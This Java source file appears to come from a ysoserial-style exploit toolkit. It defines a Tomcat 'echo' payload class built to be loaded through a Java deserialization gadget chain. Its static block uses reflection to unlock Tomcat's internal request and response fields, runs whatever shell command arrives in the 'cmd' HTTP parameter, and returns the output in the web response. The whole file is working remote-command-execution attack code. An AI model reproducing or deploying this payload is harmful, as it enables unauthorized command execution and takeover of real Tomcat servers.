package com.ding0x0.yso.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class MyTomcatEcho extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

// 解除final
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);

// 获取访问权限
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

// 获取request和response 获取static的属性，只需要传入null就可以了
            ThreadLocal<ServletResponse> lastServletResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServletRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);

            if (WRAP_SAME_OBJECT && lastServletRequest != null && lastServletResponse != null){
                // 回显
                String cmd = lastServletRequest.get().getParameter("cmd");
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                StringBuilder sb = new StringBuilder("");
                byte[] bytes = new byte[1024];
                int line = 0;
                while ((line = inputStream.read(bytes))!=-1){
                    sb.append(new String(bytes,0,line));
                }
                Writer writer = lastServletResponse.get().getWriter();
                writer.write(sb.toString());
                writer.flush();
            }else {
                // 第一遍修改WRAP_SAME_OBJECT，并且初始化
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
